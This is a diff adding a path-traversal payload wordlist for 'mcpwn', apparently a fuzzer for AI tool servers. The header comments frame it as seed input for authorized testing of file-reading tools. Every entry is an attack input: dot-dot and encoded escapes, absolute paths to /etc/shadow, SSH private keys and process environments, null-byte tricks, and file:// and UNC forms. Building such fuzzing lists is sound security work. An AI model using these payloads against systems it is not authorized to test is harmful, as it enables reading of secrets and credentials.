@@ -1,0 +1,25 @@
+# mcpwn path-traversal seed wordlist — for AUTHORIZED testing of your own tools.
+# One payload per line; '#' lines are comments. Feed into a path/filename
+# argument (fuzzArgs) of a file-reading tool and observe whether it escapes the
+# intended directory.
+#
+# Classic dot-dot escapes toward a canonical sentinel file.
+../../../../etc/passwd
+../../../../../../../../etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+....//....//....//etc/passwd
+..\..\..\..\windows\win.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+# Absolute paths that ignore the base directory entirely.
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+/root/.ssh/id_rsa
+C:\windows\win.ini
+# Null-byte / trailing tricks against naive extension checks.
+../../../../etc/passwd%00
+../../../../etc/passwd%00.txt
+# URL-ish and UNC forms some resolvers accept.
+file:///etc/passwd
+\\127.0.0.1\share\file
